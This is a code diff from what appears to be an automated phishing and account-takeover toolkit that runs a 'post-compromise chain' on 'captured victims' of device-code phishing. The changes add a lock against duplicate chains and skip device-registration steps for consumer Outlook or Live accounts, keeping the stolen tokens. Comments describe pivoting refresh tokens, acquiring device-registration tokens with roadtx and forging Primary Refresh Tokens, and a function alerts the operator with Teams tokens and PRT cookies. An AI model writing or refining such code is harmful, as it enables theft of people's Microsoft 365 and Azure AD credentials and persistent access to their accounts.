@@ -148,6 +148,7 @@ def _finalize_and_alert(user_code, teams_token, prt_cookie):
 
 
 ACTIVE_CHAINS = set()
+_CHAIN_LOCK = threading.Lock()
 
 
 def is_chain_running(user_code):
@@ -163,8 +164,15 @@ def is_prt_ready(user_code):
 
 
 def execute_post_compromise(user_code):
-    """Run the full automated post-compromise chain for a captured victim."""
-    ACTIVE_CHAINS.add(user_code)
+    """Run the full automated post-compromise chain for a captured victim.
+    Duplicate invocations (concurrent poller threads seeing SUCCESS) are
+    skipped — two racing chains corrupt each other's device certs and
+    Step 4 PRT generation fails with AADSTS501209."""
+    with _CHAIN_LOCK:
+        if user_code in ACTIVE_CHAINS:
+            logger.info(f"[EXECUTOR] Chain already running for {user_code} — skipping duplicate.")
+            return
+        ACTIVE_CHAINS.add(user_code)
     try:
         _run_post_compromise_chain(user_code)
     finally:
@@ -254,6 +262,15 @@ def _run_post_compromise_chain(user_code):
     with open(auth_file, 'w') as f:
         json.dump(auth_data, f)
     logger.info("Re-seeded auth file with original RT before DRS exchange.")
+
+    # ── PERSONAL ACCOUNTS: skip device-registration steps ────────
+    # Consumer accounts (outlook.com, live.com) have no Azure AD device
+    # registration — PRT generation cannot succeed. The captured tokens
+    # (and the Step 1 FOCI pivot if it worked) ARE the prize.
+    if (session.get('account_type') or 'work') == 'personal':
+        logger.info("[PERSONAL] Consumer account — skipping Steps 2-4 (no device registration / PRT).")
+        _finalize_and_alert(user_code, teams_token_acquired, None)
+        return
 
     # ── STEP 2: DRS Token Acquisition ──────────────────────────
     # roadtx refreshtokento reads the refreshToken from auth_file, requests
